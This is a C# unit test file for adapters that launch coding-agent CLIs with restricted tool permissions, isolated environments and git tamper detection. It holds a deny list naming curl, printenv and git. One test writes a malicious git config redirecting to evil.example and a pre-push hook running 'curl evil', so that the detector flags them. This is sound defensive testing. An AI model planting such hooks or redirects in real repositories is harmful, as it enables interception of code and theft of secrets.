using System.Text.Json.Nodes;
using AzureAgent.Domain.Agents;
using AzureAgent.Infrastructure.AgentRuntime;
using Microsoft.Extensions.Options;
using Shouldly;

namespace AzureAgent.UnitTests;

public sealed class ClaudeCodeAdapterTests : IDisposable
{
    private readonly string _root = Directory.CreateTempSubdirectory("cli-").FullName;

    public void Dispose() => Directory.Delete(_root, true);

    private CliInvocation Invocation(bool readOnly = false) => new(
        "claude-sonnet-4-5", Path.Combine(_root, "work"), Path.Combine(_root, "home"), "Follow the skills.", "Implement #1",
        ["dotnet", "npm", "git"], readOnly, 40, 5m, new Dictionary<string, string> { ["ANTHROPIC_API_KEY"] = "sk-ant-x" });

    [Fact]
    public void Repository_policy_becomes_pre_approved_tools_and_everything_else_is_denied()
    {
        var (args, env) = new ClaudeCodeAdapter("claude").Prepare(Invocation());
        args.Take(2).ShouldBe(["-p", "Implement #1"]);
        string Value(string flag) => args[args.ToList().IndexOf(flag) + 1];
        Value("--permission-mode").ShouldBe("dontAsk");
        Value("--max-turns").ShouldBe("40");
        Value("--max-budget-usd").ShouldBe("5");
        Value("--model").ShouldBe("claude-sonnet-4-5");
        args.ShouldContain("--bare");
        args.ShouldContain("--strict-mcp-config");
        var allowed = args.SkipWhile(a => a != "--allowedTools").Skip(1).ToList();
        allowed.ShouldContain("Bash(dotnet:*)");
        allowed.ShouldContain("Bash(npm:*)");
        allowed.ShouldContain("Edit");
        allowed.ShouldNotContain("Bash(git:*)");
        args.SkipWhile(a => a != "--disallowedTools").Skip(1).TakeWhile(a => !a.StartsWith("--")).ShouldBe(["Bash(git:*)", "WebFetch", "WebSearch"]);
        File.ReadAllText(Value("--append-system-prompt-file")).ShouldBe("Follow the skills.");
        if (!OperatingSystem.IsWindows()) File.GetUnixFileMode(Value("--append-system-prompt-file")).ShouldBe(UnixFileMode.UserRead | UnixFileMode.UserWrite);
        env["HOME"].ShouldBe(Path.Combine(_root, "home"));
        env["ANTHROPIC_API_KEY"].ShouldBe("sk-ant-x");
    }

    [Fact]
    public void Read_only_runs_get_no_write_or_shell_tools_and_no_mcp_servers()
    {
        var (args, _) = new ClaudeCodeAdapter("claude").Prepare(Invocation(readOnly: true));
        var allowed = args.SkipWhile(a => a != "--allowedTools").Skip(1).TakeWhile(a => !a.StartsWith("--")).ToList();
        allowed.ShouldBe(["Read", "Glob", "Grep", "LS"]);
        args.ShouldNotContain("--mcp-config");
    }

    [Fact]
    public void Stream_counts_each_api_response_once_and_reads_the_result()
    {
        var cli = new ClaudeCodeAdapter("claude");
        const string usage = "\"usage\":{\"input_tokens\":100,\"cache_read_input_tokens\":900,\"cache_creation_input_tokens\":50,\"output_tokens\":40}";
        var events = new[]
        {
            """{"type":"system","subtype":"init","model":"claude-sonnet-4-5"}""",
            $$$"""{"type":"assistant","message":{"id":"m1",{{{usage}}},"content":[{"type":"text","text":"Looking at the code"}]}}""",
            $$$"""{"type":"assistant","message":{"id":"m1",{{{usage}}},"content":[{"type":"tool_use","name":"Edit","input":{"file_path":"src/A.cs"}}]}}""",
            """{"type":"user","message":{"content":[{"type":"tool_result","content":"ok"}]}}""",
            """not json""",
            """{"type":"result","subtype":"success","is_error":false,"result":"Added tests.","total_cost_usd":0.0123,"num_turns":3,"usage":{"input_tokens":200,"cache_read_input_tokens":900,"cache_creation_input_tokens":50,"output_tokens":90}}""",
        }.SelectMany(cli.Parse).ToList();
        events.OfType<CliModelCall>().ShouldHaveSingleItem().ShouldBe(new CliModelCall(1050, 40, 900));
        events.OfType<CliText>().Single().Text.ShouldBe("Looking at the code");
        events.OfType<CliToolUse>().Single().ShouldBe(new CliToolUse("Edit", """{"file_path":"src/A.cs"}"""));
        events.OfType<CliResult>().Single().ShouldBe(new CliResult("Added tests.", false, 0.0123m, 1150, 90, 900, 3));
    }

    [Fact]
    public void An_error_result_is_an_error_even_when_its_subtype_says_success()
    {
        // Captured from Claude Code 2.1 without credentials.
        const string line = """{"type":"result","subtype":"success","is_error":true,"result":"Not logged in · Please run /login","total_cost_usd":0,"num_turns":1,"usage":{"input_tokens":0,"output_tokens":0,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}""";
        var result = new ClaudeCodeAdapter("claude").Parse(line).OfType<CliResult>().Single();
        result.IsError.ShouldBeTrue();
        result.Text.ShouldBe("Not logged in · Please run /login");
    }
}

public sealed class CursorCliAdapterTests : IDisposable
{
    private readonly string _root = Directory.CreateTempSubdirectory("cursor-").FullName;

    public void Dispose() => Directory.Delete(_root, true);

    [Fact]
    public void Workspace_permissions_allow_policy_commands_and_deny_git_and_network_tools()
    {
        var work = Path.Combine(_root, "work");
        var (args, env) = new CursorCliAdapter("cursor-agent").Prepare(new CliInvocation("sonnet-4.5", work, Path.Combine(_root, "home"), "Rules.", "Implement #1",
            ["dotnet", "curl"], false, 40, 5m, new Dictionary<string, string> { ["CURSOR_API_KEY"] = "key" }));
        args[0].ShouldBe("-p");
        args[1].ShouldStartWith("Rules.");
        args[1].ShouldEndWith("Implement #1");
        args.ShouldContain("--force");
        args[args.ToList().IndexOf("--output-format") + 1].ShouldBe("stream-json");
        var permissions = JsonNode.Parse(File.ReadAllText(Path.Combine(work, ".cursor", "cli.json")))!["permissions"]!;
        var allow = permissions["allow"]!.AsArray().Select(n => n!.GetValue<string>()).ToList();
        var deny = permissions["deny"]!.AsArray().Select(n => n!.GetValue<string>()).ToList();
        allow.ShouldBe(["Read(**)", "Write(**)", "Shell(dotnet)"]); // curl is never allowed, even if the policy lists it
        deny.ShouldContain("Shell(git)");
        deny.ShouldContain("Shell(curl)");
        deny.ShouldContain("Shell(printenv)");
        deny.ShouldContain("Write(**/.git/**)");
        env["CURSOR_API_KEY"].ShouldBe("key");
        env["HOME"].ShouldBe(Path.Combine(_root, "home"));
    }

    [Fact]
    public void Read_only_runs_propose_changes_only()
    {
        var (args, _) = new CursorCliAdapter("cursor-agent").Prepare(new CliInvocation("gpt-5", Path.Combine(_root, "w"), Path.Combine(_root, "h"), "R", "Review",
            [], true, 10, 1m, new Dictionary<string, string>()));
        args.ShouldNotContain("--force");
    }

    [Fact]
    public void Stream_maps_tool_calls_and_the_result()
    {
        var cli = new CursorCliAdapter("cursor-agent");
        var events = new[]
        {
            """{"type":"system","subtype":"init","model":"sonnet-4.5","session_id":"s"}""",
            """{"type":"assistant","message":{"role":"assistant","content":[{"type":"text","text":"Reading files"}]},"session_id":"s"}""",
            """{"type":"tool_call","subtype":"started","call_id":"c1","tool_call":{"shellToolCall":{"args":{"command":"dotnet test"}}},"session_id":"s"}""",
            """{"type":"tool_call","subtype":"completed","call_id":"c1","tool_call":{"shellToolCall":{"args":{"command":"dotnet test"},"result":{"success":{}}}},"session_id":"s"}""",
            """{"type":"result","subtype":"success","is_error":false,"duration_ms":1234,"result":"Done.","session_id":"s"}""",
        }.SelectMany(cli.Parse).ToList();
        events.OfType<CliToolUse>().ShouldHaveSingleItem().ShouldBe(new CliToolUse("shell", """{"command":"dotnet test"}"""));
        events.OfType<CliModelCall>().ShouldBeEmpty();
        events.OfType<CliResult>().Single().ShouldBe(new CliResult("Done.", false, null, null, null, null, null));
    }
}

public sealed class ProcessIsolationTests : IDisposable
{
    private readonly string _root = Directory.CreateTempSubdirectory("proc-").FullName;
    private readonly ProcessRunner _runner = new(Options.Create(new AgentRuntimeOptions()));

    public void Dispose() => Directory.Delete(_root, true);

    [Fact]
    public async Task Children_never_see_the_server_environment()
    {
        Environment.SetEnvironmentVariable("ConnectionStrings__Postgres", "Host=db;Password=secret");
        try
        {
            var result = await _runner.RunAsync("env", [], _root, new Dictionary<string, string> { ["HOME"] = _root, ["EXTRA"] = "1" }, TimeSpan.FromSeconds(10), CancellationToken.None);
            result.Output.ShouldNotContain("Password=secret");
            result.Output.ShouldContain($"HOME={_root}");
            result.Output.ShouldContain("EXTRA=1");
            result.Output.ShouldContain("PATH=");
            result.Output.ShouldContain("GIT_CONFIG_NOSYSTEM=1");
        }
        finally { Environment.SetEnvironmentVariable("ConnectionStrings__Postgres", null); }
    }

    [Fact]
    public async Task Streaming_delivers_lines_in_order_and_a_failing_callback_kills_the_process()
    {
        var lines = new List<string>();
        var ok = await _runner.RunStreamingAsync("sh", ["-c", "echo one; echo two >&2; echo three"], _root, null, TimeSpan.FromSeconds(10),
            line => { lines.Add(line); return Task.CompletedTask; }, CancellationToken.None);
        lines.ShouldBe(["one", "three"]);
        ok.Output.ShouldContain("two");

        var started = DateTime.UtcNow;
        await Should.ThrowAsync<RunLimitExceededException>(() => _runner.RunStreamingAsync("sh", ["-c", "echo go; sleep 30"], _root, null, TimeSpan.FromSeconds(60),
            _ => throw new RunLimitExceededException("stop"), CancellationToken.None));
        (DateTime.UtcNow - started).ShouldBeLessThan(TimeSpan.FromSeconds(10));
    }

    [Fact]
    public void Git_metadata_fingerprint_detects_config_and_hook_changes()
    {
        var repo = Path.Combine(_root, "repo");
        Directory.CreateDirectory(Path.Combine(repo, ".git", "hooks"));
        File.WriteAllText(Path.Combine(repo, ".git", "config"), "[core]\n");
        var before = AgentRunExecutor.GitMetadataFingerprint(repo);
        File.WriteAllText(Path.Combine(repo, "README.md"), "changes to tracked files are fine");
        AgentRunExecutor.GitMetadataFingerprint(repo).ShouldBe(before);
        File.AppendAllText(Path.Combine(repo, ".git", "config"), "[url \"https://evil.example/\"]\n\tinsteadOf = https://dev.azure.com/\n");
        AgentRunExecutor.GitMetadataFingerprint(repo).ShouldNotBe(before);
        File.WriteAllText(Path.Combine(repo, ".git", "config"), "[core]\n");
        File.WriteAllText(Path.Combine(repo, ".git", "hooks", "pre-push"), "#!/bin/sh\ncurl evil");
        AgentRunExecutor.GitMetadataFingerprint(repo).ShouldNotBe(before);
    }
}

public sealed class AgentRuntimeCatalogTests
{
    [Fact]
    public async Task Missing_executables_are_reported_instead_of_failing()
    {
        var options = Options.Create(new AgentRuntimeOptions
        {
            WorkspaceRoot = Directory.CreateTempSubdirectory("catalog-").FullName,
            ClaudeCliPath = "/nonexistent/claude",
            CursorCliPath = "/nonexistent/cursor-agent",
        });
        var catalog = new AgentRuntimeCatalog(new ProcessRunner(options), new CodingCliFactory(options), options,
            new Microsoft.Extensions.Caching.Memory.MemoryCache(new Microsoft.Extensions.Caching.Memory.MemoryCacheOptions()));
        var runtimes = await catalog.ListAsync(CancellationToken.None);
        runtimes.Single(r => r.Runtime == AgentRuntime.Framework).Available.ShouldBeTrue();
        runtimes.Single(r => r.Runtime == AgentRuntime.CursorCli).ShouldSatisfyAllConditions(
            r => r.Available.ShouldBeFalse(), r => r.Detail.ShouldBe("'/nonexistent/cursor-agent' is not installed on this node"));
    }
}
